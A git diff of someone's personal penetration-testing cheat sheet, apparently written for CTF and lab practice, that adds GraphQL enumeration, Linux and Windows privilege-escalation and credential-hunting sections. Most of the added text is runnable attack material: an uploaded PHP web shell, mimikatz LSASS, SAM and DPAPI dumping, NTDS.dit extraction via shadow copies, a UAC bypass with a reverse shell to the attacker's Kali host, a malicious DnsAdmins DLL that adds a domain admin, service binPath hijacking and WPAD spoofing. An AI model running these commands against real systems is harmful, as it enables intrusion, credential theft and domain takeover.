@@ -171,9 +171,9 @@ Supported services:
 
 - john:
 
-  ```bash
-  john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --fork=15
-  ```
+	```bash
+	john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --fork=15
+	```
 
 - hashcat
 
@@ -2535,6 +2535,14 @@ There are different types of POST parameters formats, depending on the *content 
 - `Content-Type: application/json` &rarr; `-d "{'PARAM':'value'}"`
 -  `Content-type: multipart/form-data`
 
+### Metadata
+
+Every time you find a document or image file, check all metadata fields:
+
+```bash
+exiftool [FILE]
+```
+
 ### Common Application
 
 #### Amazon Buckets
@@ -2558,6 +2566,46 @@ If php files are shown, it means that the bucket is handling the php page. Thus 
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
 aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
 ```
+
+#### APIs
+
+##### **Web Services (SOAP/XML)**
+
+##### REST APIs
+
+API with multiple endpoints
+
+##### GraphQL
+
+By **default** graphQL does **not** implement authentication, has a **single endpoint**.
+
+- **Endpoint discovery:**
+
+  - ```bash
+  python3 ~/TOOLS/graphw00f/main.py -d -f -t [URL]
+  	```
+
+  - Send an universal query (with param `'{"query":"query { __typename }"}'` to:
+
+  	- */graphql*
+
+  	- */graphiql*
+
+  	- */graphql.php*
+
+  	- */graphql/console*
+
+  	- appending `/v1` to the path
+
+  - Usually they only accept POST requests that have a content-type of `application/json`, but also GET or `x-www-form-urlencoded` can work.
+
+- **Introspection query**
+
+	```bash
+	curl [URL] -X POST -H "Content-Type: application/json" -d '{"query": "query { __schema { queryType { fields { name } } mutationType { fields { name } } } }"}' | jq
+	```
+
+	- Look for queries, mutations, and everything that doesn't start with `__`
 
 #### CGI, CGI-BIN
 
@@ -2808,7 +2856,7 @@ https://hacktricks.boitatech.com.br/misc/basic-python/bypass-python-sandboxes
 
 Vulnerable to mass assignment exploit: 
 
- Endpoints with PATCH/PUT Capabilities → [Assignment Parameters](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/README.md#exploiting-a-mass-assignment)
+Endpoints with PATCH/PUT Capabilities → [Assignment Parameters](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/README.md#exploiting-a-mass-assignment)
 
 #### Splunk
 
@@ -5162,7 +5210,7 @@ Send a local service to your machine.
 
   1. On your machine, run `ligstart` to start the ligolo server
 
-  2. File transfer  the agent on the target from `TOOLS/ligolo-ng/dist`
+  2. File transfer  the agent on the target from `TOOLS/LIGOLO-AGENTS`
 
   3. On the target:
 
@@ -5181,7 +5229,7 @@ Send a local service to your machine.
   5. On you PC, add the route
 
      ```bash
-     sudo ip route add 240.0.0.1 dev ligolo
+     sudo ip route add 240.0.0.1/32 dev ligolo
      ```
 
   6. Access any local port on `240.0.0.1:[PORT]`
@@ -5469,10 +5517,16 @@ Forward a local service to a remote port. Usually used to gain shells or exchang
 
 ### Fundamentals
 
-**Linux smart Enumeration**
+#### Terminal tricks
+
+**EOF Writing**
+
+Useful to write a file without a text editor
 
 ```bash
-./lse.sh -l1 -e /run,/proc,/sys
+cat << EOF > [OUTPUT]
+[WRITE_CONTENT_HERE]
+EOF
 ```
 
 - Terminal:
@@ -5490,6 +5544,10 @@ Forward a local service to a remote port. Usually used to gain shells or exchang
   - Bash header: `#!/bin/bash`
   - Execute bash script: `chmod +x [FILE]` &rarr; `./[FILE]`
   - C compile: `gcc file.c -o file` &rarr; `./file`
+
+#### Tools
+
+./lse.sh -l1 -e /run,/proc,/sys
 
 
 ### Users & Privileges
@@ -5527,7 +5585,7 @@ Forward a local service to a remote port. Usually used to gain shells or exchang
   - [Method2](https://hacktricks.boitatech.com.br/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation) &rarr; `cd /mnt/root`
 
 
-#### PRIVILEGES
+#### Privileges
 
 [GTFOBins](https://gtfobins.github.io/)
 
@@ -5732,20 +5790,27 @@ getcap -r / 2>/dev/null
 
 Directories & Files Worth Checking:
 
+- Look for other users:
+  
+  ```bash
+  grep -RHine '[USER]' /home /root /var /dev /opt /tmp 2>/dev/null
+  ```
+  
 - Local Hashes
+  
   - `/etc/shadow`
-
+  
   - `/etc/security/opasswd`
   
 - User Data
   - User Owned / Readable Files
   
     ```bash
-    find / -type f -user [group] 2>/dev/null | grep -v -E "/proc|/sys|/run|/var/lib|/usr/src|/usr/share|/usr/lib|/var/cache|/boot|/etc|/bin|/sbin|/include|/log|/var/backups"
+    find / -type f -user [group] 2>/dev/null | grep -v -E "/proc|/sys|/run|/var/lib|/usr/src|/usr/share|/usr/lib|/var/cache|/boot|/etc|/bin|/sbin|/include|/log"
     ```
   
     ```bash
-    find / -type f -readable 2>/dev/null | grep -v -E "/proc|/sys|/run|/var/lib|/usr/src|/usr/share|/usr/lib|/var/cache|/boot|/etc|/bin|/sbin|/include|/log|/var/backups"
+    find / -type f -readable 2>/dev/null | grep -v -E "/proc|/sys|/run|/var/lib|/usr/src|/usr/share|/usr/lib|/var/cache|/boot|/etc|/bin|/sbin|/include|/log"
     ```
   
   - User Data Directories
@@ -5796,16 +5861,17 @@ Directories & Files Worth Checking:
 
   Credentials are variable assignments, which are made of:
 
-  - name: password, credential, pass, psw, token, key, secret
+  - name: password, cred, pass, psw, token, key, secret
   - separator: =, : (with or without space)
   - quotes
 
   Some examples:
 
   ```bash
-  grep -RHine "password = '" .		# string assignment (try also with \")
+  grep -RHine "password = '" .	# string assignment (try also with \")
   grep -RHine "password':" . 		# dictionary assignment
-  grep -RHine "password'," .		# tuple assignment
+  grep -RHine "password'," .		# tuple/list assignment
+  grep -RHine "[PROTOCOL]://"		# URI assignment
   ```
 
 - Shadow Hashes `/etc/shadow` 
@@ -6209,54 +6275,201 @@ Right click on the folder `Properties` -> `Security` -> `Advanced` -> `cybervaca
 
 ### Users & Privileges
 
-- Users & Groups
-  - Every local user: `net user`
-  - for every user: `net user [USER]`
-  - `tree /adh /f c:\users`
-  - The users that are currently logged in: `query user`
-  - Password policy: `net accounts`
-  - Env variables: `set`
+- Every local user: `net user`
+- for every user: `net user [USER]`
+- `tree /a /f c:\users`
+- The users that are currently logged in: `query user`
+- Password policy: `net accounts`
+- Env variables: `set`
 
-- Memberships & Privileges
+#### GUI Access Abuse
 
-  -  `whoami /all`
-  -  Check non-default groups -> [Exploits](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html)
-  -  Check non-default privileges -> [Exploits](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html?highlight=sebackup#sebackupprivilege)
-     - `SeDebug`
-     - `SeBackup`: full read access
-     - `SeImpersonate` / `SeAssignPrimaryToken`
-     - `SeRestore` &rarr; [xct_exploit](https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe)
-     - `SeManage`
+- [CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
+- [Support App](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#insecure-gui-apps) → [EoP Exploitation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#from-low-priv-user-to-nt-authority-system-cve-2019-1388-uac-bypass)
 
-- GUI access Abuse (e.g. xfreerdp)
+#### UAC Upgrade
 
-  - [CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
-  - [Support App](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#insecure-gui-apps) → [EoP Exploitation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#from-low-priv-user-to-nt-authority-system-cve-2019-1388-uac-bypass)
+When you are member of Administrators, but you have restricted privileges and file access of a true SYSTEM user
 
-- Shell Logging
+- Enumeration `whoami /groups`
 
-  - CMDKey
-    - `cmdkey /list`
-    - `runas /savecred /user:[USER] [CMD_HERE]`
+	- Normal Users   → Check if not `High Mandatory Label`
+	- Administrators  → Check if not `System Mandatory Label`
 
-  - Console History
-    - `(Get-PSReadLineOption).HistorySavePath`
-    - `dir /adh /s /b ConsoleHost_history.txt`
+- Bypasess
 
-  - StickyNotes 
-    - `c:\Users\[USER]\AppData\Roaming\Microsoft\Sticky Notes`
-    - `cd C:\Users` → `dir /adh /s /b *.sqlite`
+	- GUI Access                        
 
-  - Clipboard (copy-paste)
-    - `Get-Clipboard`
-    - `Invoke-ClipboardLogger`
+		-  CMD “Run as Administrator”
+		-  PS:  `Start-Process cmd.exe -verb runas`
 
-  - Transcripts & Logs
-    - `dir C:\Transcripts`
-    - `Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView`
-    - `Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview`
+	- [UACME]([Exploit Reference](https://github.com/hfiref0x/UACME))
 
-#### SeImpersonate / SeAssignPrimaryToken
+		- Get build number: `systeminfo | findstr "OS"`
+
+		- Find key in the repo, related to the build number
+
+		- ```cmd
+			Akagi64.exe [KEY] [CMD]
+			```
+
+	- [Runas](https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1)
+
+		- To get a Rev Shell:
+
+			```powershell
+			Invoke-RunasCs -username [USER] -password "[PASS]" -Command cmd.exe -Remote [KALI_IP]:[PORT] -LogonType 8 -BypassUac
+			```
+
+		- To get a general command execution:
+
+			```powershell
+			Invoke-RunasCs -username [USER] -password "[PASS]" -Cmd "[CMD]" -LogonType 8 -BypassUac
+			```
+
+#### Privileges
+
+-  `whoami /all` 
+
+-  Check non-default privileges -> [Exploits](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html?highlight=sebackup#sebackupprivilege)
+
+-  Enable a single privilege:
+
+   ```powershell
+   Set-[Privilege]
+   Get-[Privilege]
+   ```
+
+-  Enable all privileges:
+   
+   - Service account (NT):  [FullPowers](https://github.com/itm4n/FullPowers)
+   - User account: [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) `.\EnableAllTokenPrivs.ps1`
+
+##### SeBackup
+
+Allows to traverse any folder and list the folder contents. This will let us copy a file from a folder, even if there is no access control  entry (ACE) for us in the folder's access control list (ACL).
+
+- **Local**: Arbitrary File Read
+
+	1. Import [PS Modules](https://github.com/giuliano108/SeBackupPrivilege)
+
+		- ```powershell
+			Import-Module .\SeBackupPrivilegeUtils.dll
+			```
+
+		- ```powershell
+			Import-Module .\SeBackupPrivilegeCmdLets.dll
+			```
+
+	2. Enable the privilege
+
+		```powershell
+		Set-SeBackupPrivilege
+		```
+
+	3. ```powershell
+		Copy-FileSeBackupPrivilege '[PATH\TO\FILE]' .\[OUT]
+		```
+
+- **AD/Local**: DiskShadow
+
+	1. Create a shadow copy of the `C` drive and expose it as `E` drive.
+
+		```powershell
+		diskshadow.exe
+		DISKSHADOW> set verbose on
+		DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
+		DISKSHADOW> set context clientaccessible
+		DISKSHADOW> set context persistent
+		DISKSHADOW> begin backup
+		DISKSHADOW> add volume C: alias cdrive
+		DISKSHADOW> create
+		DISKSHADOW> expose %cdrive% E:
+		DISKSHADOW> end backup
+		DISKSHADOW> exit
+		dir E:
+		```
+
+	2. **AD**: Copy `NTDS.dit` from the shadow copy:
+
+		- ```powershell
+			Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit	# Needs PS Modules
+			```
+
+		- ```powershell
+			robocopy /B E:\Windows\NTDS .\ntds ntds.dit
+			```
+
+	3. **Local**: Extract SAM Hashes
+
+		```cmd
+		reg save HKLM\SYSTEM SYSTEM.SAV
+		reg save HKLM\SAM SAM.SAV
+		```
+
+	4. Export on Kali & retrieve hashes
+
+		```bash
+		secretsdump.py -ntds [NTDS_FILE] -system [SYSTEM_FILE] LOCAL
+		secretsdump.py -system system.sav -sam sam.sav LOCAL
+		```
+
+##### SeDebug
+
+Allows to steal credentials from common processes or get a SYSTEM shell, by executing the [Mimikatz](https://github.com/ParrotSec/mimikatz/tree/master/x64) binary 
+
+- [Mimikatz](https://github.com/ParrotSec/mimikatz) / [Invoke-Mimikatz](https://github.com/PowershellMafia/Powersploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1) → [All Commands / Techniques](https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/cheatsheets/mimikatz-cheatsheet.md)
+
+- Meterpreter Dumping
+
+	1. pgrep [winlogon/lsass]` → `migrate [PID]
+	2. Dumps credentials using most of the Mimikatz modules
+	3. `load kiwi`
+	4. `creds_all`
+	5. `hashdump`
+
+- LSASS Dumping
+
+	```cmd
+	mimikatz '"privilege::debug" "token::elevate" "sekurlsa::logonPasswords /patch"'
+	```
+
+	- If it doesn't work: LSAIO Bypass
+		- `reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa` → Check if Enabled
+		- `misc::memssp` → `privilege::debug` → `!+` → `!processprotect /process:lsass.exe /remove`
+	- Manual, without mimikatz
+		1. Get PID → `Get-Process lsass`, `tasklist /svc`
+		2. `rundll32 C:\windows\system32\comsvcs.dll, MiniDump [PID] [OUT_DMP] full`
+		3. `pypykatz lsa minidump [DMP_FILE]`     → After DMP is Tranferred to Kali
+
+- RDP / DPAPI / VAULT Dumping
+
+	```cmd
+	mimikatz.exe '"privilege::debug" "token::elevate" "sekurlsa::dpapi"'
+	mimikatz.exe '"privilege::debug" "token::elevate" "sekurlsa::credman"'
+	mimikatz.exe '"privilege::debug" "token::elevate" "vault::cred /patch"'
+	```
+
+- SAM / LSA Dumping (steals *local* hashes -> users appearing in `net user`)
+
+	```cmd
+	mimikatz.exe '"privilege::debug" "token::elevate" "lsadump::sam"'
+	mimikatz.exe'"privilege::debug" "token::elevate" "lsadump::lsa /patch"'
+	mimikatz '"privilege::debug" "token::elevate" "lsadump::secrets /patch"'
+	```
+
+- SYSTEM Shell (RCE)
+
+	- Meterpreter
+		- `pgrep [winlogon/lsass]` &rarr; Get PID
+		- `migrate [PID]`
+	- Manual
+		- `tasklist` &rarr;  Get `winlogon` or `lsass` PID
+		- [Method 1](https://github.com/decoder-it/psgetsystem/blob/master/psgetsys.ps1)  → `. .\psgetsys.ps1; ImpersonateFromParentPid -ppid [PID] -command [CMD] -cmdargs [ARGS]`
+		- [Method 2](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
+		- [Method 3](https://github.com/dev-zzo/exploits-nt-privesc/blob/master/SeDebugPrivilege/SeDebugPrivilege.c)
+
+##### SeImpersonate / SeAssignPrimaryToken
 
 You must be a **Service Account:** `NT *` or a member of a group with name `SQL / IIS / NETWORK / LOCAL`
 
@@ -6277,121 +6490,263 @@ Potatoes:
 - [Hot Potato](https://github.com/Kevin-Robertson/Tater) - Windows 7 - 10 / Server 2008 - 2012 - PS Based
 - [MultiPotato](https://github.com/S3cur3Th1sSh1t/MultiPotato) - When Others Fail → Useful for MSSQL
 - Meterpreter shell (auto exploit, when the exploit is old), not stealthy
-  - `load incognito` 
-  - `list_tokens -u` -> Lists allowed users to impersonate
-  - `impersonate_token [USER]` -> Double Backlashes for Username!
+	- `load incognito` 
+	- `list_tokens -u` -> Lists allowed users to impersonate
+	- `impersonate_token [USER]` -> Double Backlashes for Username!
 
+##### SeLoadDriver
 
-#### SeDebug
+It allows to **load and unload device drivers** with the creation of a registry entry with specific values for `ImagePath` (where the `.sys` driver file is located) and `Type` (kind of driver).
 
-Allows to steal credentials from common processes or get a SYSTEM shell, by executing the [Mimikatz](https://github.com/ParrotSec/mimikatz/tree/master/x64) binary 
+Thus, we can exploit it though the Capcom driver, that allows any user to execute shellcode with SYSTEM privileges. 
 
-- [Mimikatz](https://github.com/ParrotSec/mimikatz) / [Invoke-Mimikatz](https://github.com/PowershellMafia/Powersploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1) → [All Commands / Techniques](https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/cheatsheets/mimikatz-cheatsheet.md)
-  
-- Meterpreter Dumping
-  
-  - Dumps credentials using most of the Mimikatz modules
-  - `load kiwi`
-  - `creds_all`
-  - `hashdump`
-  
-- LSASS Dumping
+Following this [GUIDE](https://github.com/cbbn00/SeLoadDriverAbuse) (different in [academy](https://academy.hackthebox.com/module/67/section/605))
 
-  ```cmd
-  mimikatz '"privilege::debug" "token::elevate" "sekurlsa::logonPasswords /patch"'
-  ```
+1. Open an SMB share from `~/TOOLS/PRIVESC_WINDOWS/SeLoadDriverAbuse`
 
-  - Manual, without mimikatz
-    1. Get PID → `Get-Process lsass`, `tasklist /svc`
-    2. `rundll32 C:\windows\system32\comsvcs.dll, MiniDump [PID] [OUT_DMP] full`
-    3. `pypykatz lsa minidump [DMP_FILE]`     → After DMP is Tranferred to Kali
+2. Copy in this location (IMPORTANT)
 
-- RDP / DPAPI / VAULT Dumping
+	```cmd
+	copy \\[IP]\share\shell.exe c:\windows\tasks\shell.exe
+	```
 
-  ```cmd
-  mimikatz.exe '"privilege::debug" "token::elevate" "sekurlsa::dpapi"'
-  mimikatz.exe '"privilege::debug" "token::elevate" "sekurlsa::credman"'
-  mimikatz.exe '"privilege::debug" "token::elevate" "vault::cred /patch"'
-  ```
+3. Load the driver:
 
-- SAM / LSA Dumping (steals *local* hashes -> users appearing in `net user`)
+	```cmd
+	\\[IP]\share\EoPLoadDriver.exe System\CurrentControlSet\Capcom \\[IP]\share\Capcom.sys
+	```
 
-  ```cmd
-  mimikatz.exe '"privilege::debug" "token::elevate" "lsadump::sam"'
-  mimikatz.exe'"privilege::debug" "token::elevate" "lsadump::lsa /patch"'
-  mimikatz '"privilege::debug" "token::elevate" "lsadump::secrets /patch"'
-  ```
+4. Exploit:
 
-- SYSTEM Shell (RCE)
-  - Meterpreter
-    - `pgrep [winlogon/lsass]` &rarr; Get PID
-    - `migrate [PID]`
-  - Manual
-    - `tasklist` &rarr;  Get `winlogon` or `lsass` PID
-    - [Method 1](https://github.com/decoder-it/psgetsystem/blob/master/psgetsys.ps1)  → `. .\psgetsys.ps1; ImpersonateFromParentPid -ppid [PID] -command [CMD] -cmdargs [ARGS]`
-    - [Method 2](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
-    - [Method 3](https://github.com/dev-zzo/exploits-nt-privesc/blob/master/SeDebugPrivilege/SeDebugPrivilege.c)
+	```cmd
+	\\10.10.14.178\share\ExploitCapcom.exe
+	```
 
-#### SeBackup
+##### SeTakeOwnership
 
-- SAM Dumping (steals *local* hashes -> users appearing in `net user`)
+1. [takeown](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown) Windows binary to change ownership of the file: 
 
-  1. `reg save hklm\sam c:\windows\temp\sam.sav`
-  2. `reg save hklm\system c:\windows\temp\system.sav`
-  3. Download on Kali system.sav and sam.sav
-  4. Extract hashes on Kali: `secretsdump.py -system system.sav -sam sam.sav LOCAL`
-- NTDS Dumping (Only on a DC Server)
+	```cmd
+	takeown /f '[FILE/FOLDER]'
+	```
 
-  - `secretsdump.py -ntds [NTDS_FILE] -system [SYSTEM_FILE] LOCAL`
-  - NTDSUtil
-    - `ntdsutil 'ac i ntds' 'ifm' 'create full c:\windows\temp\NTDS' q q`
-    - `C:\Windows\Temp\NTDS\Active Directory\ntds.dit`
-    - `C:\Windows\Temp\NTDS\registry\SYSTEM`
-  - DiskShadow
-    - `unix2dos [PAYLOAD.dsh]` → Transfer → `diskshadow /s [PAYLOAD.dsh]`
-    - Payload
-      - `set context persistent nowriters`
-      - `add volume c: alias cvol`
-      - `create`
-      - `expose %cvol% z:`
-    - Copy Data
-      - `robocopy /b z:\windows\ntds c:\windows\temp ntds.dit`
-      - `reg save hklm\system c:\windows\temp\system`
-  - NinjaCopy
-    - `Invoke-NinjaCopy.ps1 -Path "C:\Windows\NTDS\ntds.dit" -LocalDestination "C:\Windows\Temp\ntds"`
-    - `reg save hklm\system c:\windows\temp\system`
-  - VSSAdmin
-    - `vssadmin create shadow /for=C:`
-    - `copy $ShadowCopyName\Windows\NTDS\NTDS.dit C:\Windows\Temp\NTDS.dit.save`
-    - `copy $ShadowCopyName\Windows\System32\config\SYSTEM C:\Windows\Temp\SYSTEM.save`
-- Arbitrary File Read
-  - `Copy-FileSeBackupPrivilege '[PATH\TO\FILE]' .\[OUT]`
-  - PS Modules
-    - `Import-Module .\SeBackupPrivilegeUtils.dll`
-    - `Import-Module .\SeBackupPrivilegeCmdLets.dll`
-    - `Set-SeBackupPrivilege`
+2. Modify the file ACL (Access Control List)
+
+	```cmd
+	icacls "[FILE/FOLDER]" /grant %username%:F
+	```
+
+- `F`: full access
+- `R/W` Read/write access
+
+Some example files:
+
+```shell-session
+c:\inetpub\wwwwroot\web.config
+%WINDIR%\repair\sam
+%WINDIR%\repair\system
+%WINDIR%\repair\software, %WINDIR%\repair\security
+%WINDIR%\system32\config\SecEvent.Evt
+%WINDIR%\system32\config\default.sav
+%WINDIR%\system32\config\security.sav
+%WINDIR%\system32\config\software.sav
+%WINDIR%\system32\config\system.sav
+```
+
+Also `.kdbx` KeePass database files, OneNote notebooks, files such as `passwords.*`, `pass.*`, `creds.*`, scripts...
+
+#### Groups
+
+-  `whoami /all` 
+-  Check non-default groups -> [Exploits](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html)
+
+##### DnsAdmins (AD)
+
+Members of the **DnsAdmins** group can exploit their  privileges to load an arbitrary DLL with SYSTEM privileges on a DNS  server, often hosted on **Domain Controllers.**
+
+- **Add the user to Domain Admin**
+
+	1. Check your role:
+
+		```powershell
+		Get-ADGroupMember -Identity DnsAdmins
+		```
+
+	2. Write a DLL to go from DNS Admin to Domain Admin (or rev shell)
+
+		- Easier, less stealthy
+
+			```powershell
+			msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
+			```
+
+		- Follow [KDNS Method](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
+
+			- Clone the [mimikatz repository](https://github.com/gentilkiwi/mimikatz) and go inside `mimilib` folder
+
+			- Change [kdns.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) by adding a `system("CMD_HERE");` below the `fclose()` line in the file and remove the `klog()` line
+
+			- Compile `mimilib.dll`
+
+			- ```bash
+				x86_64-w64-mingw32-gcc -shared -o evil.dll kdns.c #64-Bit
+				i686-w64-mingw32-gcc -shared -o evil.dll kdns.c   #32-Bit
+				```
+
+	3. Load the custom DLL
+
+		```cmd
+		dnscmd.exe /config /serverlevelplugindll [PATH]\adduser.dll
+		```
+
+	4. Restart the DNS service (if you have permissions) or wait
+
+		```cmd
+		sc stop dns				# Makes the AD stop working
+		sc start dns
+		```
+
+	5. Confirm (look for you user)
+
+		```cmd
+		net group "Domain Admins" /dom
+		```
+
+	6. Clean-up (if not in CTF)
+
+		```cmd
+		reg query \\[IP]\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
+		reg delete \\[IP]\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
+		sc.exe start dns
+		sc query dns
+		```
+
+- **Create WPAD Record**
+
+	To perform traffic spoofing and steal passwords
+
+	1. Disable the global query block list
+
+		```cmd
+		Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
+		```
+
+	2. Add WPAD Record to Kali
+
+		```cmd
+		Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address [KALI_IP]
+		```
+
+	3. Use [Responder](https://github.com/lgandx/Responder) or [Inveigh](https://github.com/Kevin-Robertson/Inveigh) to perform traffic spoofing
+
+##### Event Log Reader
+
+They can read logs.
+
+- Read priviliged logs
+
+	```cmd
+	wevtutil qe Security /rd:true /f:text | findstr "/user"
+	```
+
+	- `/u:[USER] /p:[PASS]` Add credentials of the Log Reader
+
+- Read general logs
+
+	```powershell
+	Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
+	```
+
+	- Run as another user with the `-Credential` parameter.
+
+##### Hyper-V Administrators (AD)
+
+Firefox's Mozilla Maintenance Service can be exploited to execute commands as SYSTEM, by creating a hard link to a protected SYSTEM file and replacing it with a malicious  executable:
+
+bash
+
+```bash
+takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
+sc.exe start MozillaMaintenance
+```
+
+Note: Hard link exploitation has been mitigated in recent Windows updates.
+
+##### Print Operators
+
+See SeLoadDriver privilege
+
+##### Server Operators
+
+- Full Services Access  → BinPath Overwrite: add yourself to Administrators
+
+	1. Find a service run by Local system
+
+	2. Add yourself to administrator 
+
+		```cmd
+		sc config AppReadiness binPath= "cmd /c net localgroup Administrators [USER] /add"
+		sc start AppReadiness
+		```
+
+	3. Restart
+
+	4. Retrieve NTLM Passwords (or other):
+
+		```cmd
+		secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
+		```
+
+#### Shell Logging
+
+- CMDKey
+  - `cmdkey /list`
+  - `runas /savecred /user:[USER] [CMD_HERE]`
+
+- Console History
+  - `(Get-PSReadLineOption).HistorySavePath`
+  - `dir /adh /s /b ConsoleHost_history.txt`
+
+- StickyNotes 
+  - `c:\Users\[USER]\AppData\Roaming\Microsoft\Sticky Notes`
+  - `cd C:\Users` → `dir /adh /s /b *.sqlite`
+
+- Clipboard (copy-paste)
+  - `Get-Clipboard`
+  - `Invoke-ClipboardLogger`
+
+- Transcripts & Logs
+  - `dir C:\Transcripts`
+  - `Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView`
+  - `Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview`
 
 ### Credential Hunting:
 
-- Check locations:
+- configuration files in installed applications 
 
-  - Desktop: `cd C:\Users\[USER]\Desktop`
+  In `C:` or `Program Files`, usually they end with `.ini`, `.txt`
 
-  - configuration files in installed applications 
+  ```powershell
+  findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
+  ```
 
-    In `C:` or `Program Files`, usually they end with `.ini`, `.txt`
+- log files
 
-  - log files
+- Browsers:
 
-  - History `PSReadLine`
+	- Chrome: Search for `Dictionary.txt`
 
-- Saved passwords `cmdkey /list`
+		```powershell
+		gc 'Custom Dictionary.txt' | Select-String password
+		```
 
-  ````cmd
-  runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
-  ````
+- Filenames:
 
-- `tree /a /f c:\users`
+	```cmd
+	dir /s/b /A:-D RDCMan.settings == *.rdp == *.bak == *.BAK == web.config == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == *.db == db.* == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *password* == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == SiteList.xml == tomcat-users.xml == *.kdbx == *.config == FreeSSHDservice.ini == unattend.* == unattended.* == *.zip == *.rar == *.xls == *.xlsx == *.doc == *.docx == NetSetup.log == *sysprep.inf == *.vnc == StickyNotes.* == *.snt == *.cred == *sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == confCons.xml == SAM == SYSTEM == SECURITY https-xampp.conf == my.ini == creds.* == *credentials* == *password* == pass.* == my.cnf == access.log == error.log == server.xml == Groups.xml == ConsoleHost_history.txt == credentials.db == index.dat == access_tokens.db == legacy_credentials == accessTokens.json == *.bat == _*_.ps1 == id_rsa == *.kbdx == *.sql* == *.sql == pagefile.sys == *.vhd == *.vhdx == *.vmdk == *.ppk == azureProfile.json == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == *pass*.txt == *pass*.xml == *pass*.ini == *cred* == shadow == ntuser.dat 2>nul | findstr /v ".dll"
+	```
+
+	- **Powershell credentials:**  can only be decrypted by the same user on the same computer they were created
 
 ### Files
 
@@ -6419,10 +6774,69 @@ Allows to steal credentials from common processes or get a SYSTEM shell, by exec
 ### Local Network Services
 
 - `netstat -ano | findstr LISTEN`
+	1. Look for processes that don't listen globally (after the `0.0.0.0` in the first column) 
+	2. get the `PID` (4th column)
+	3. `tasklist /v /fi | findstr [PID`]
 - Network Information
   - `route PRINT`
   - `ipconfig /all`
 
+### Local Services
+
+#### Enumeration
+
+- Manual:
+
+	```cmd
+	wmic service get displayname,startmode,startname,pathname | findstr /iv "c:\windows\\" | findstr /iv "Disabled" | findstr /iv "Unknown"
+	```
+
+	- Ignore services with spaces (they are 90% of the case, fake)
+
+	Autorun services:
+
+	```cmd
+	wmic startup get name,location,command,user
+	```
+
+- Auto: 
+
+	- cmd: [SharpUp](https://github.com/GhostPack/SharpUp/) `.\SharpUp.exe audit`
+	- powershell: PowerUP
+
+#### Exploit
+
+- **Unquoted Path**:
+
+	Every time there is a space, try to see if you can write that folder with an executable with the name up to that position of the path. 
+
+	E.g. `C:\Program Files\GVFS\GVFS.Service.exe` &rarr; write `C:\Program.exe`
+
+- **Replace Binary**
+
+	See if you directly write the binary
+
+- **Path Overwrite**
+
+	- BinPath (only normal services)
+
+		```cmd
+		sc config [SERVICE] binPath="[MALWARE/CMD]"
+		```
+
+		First try to write `" "` to check if you have permission
+
+	- ImagePath (only on autorun services)
+
+		```powershell
+		Set-ItemProperty -Path HKLM:[REG\PATH] -Name "ImagePath" -Value "[CMD]"
+		```
+
+- **Restart:**
+
+	- Manual: `sc [stop/start] [SERVICE]` (`sc query` to verify)
+		- The service will fail to start
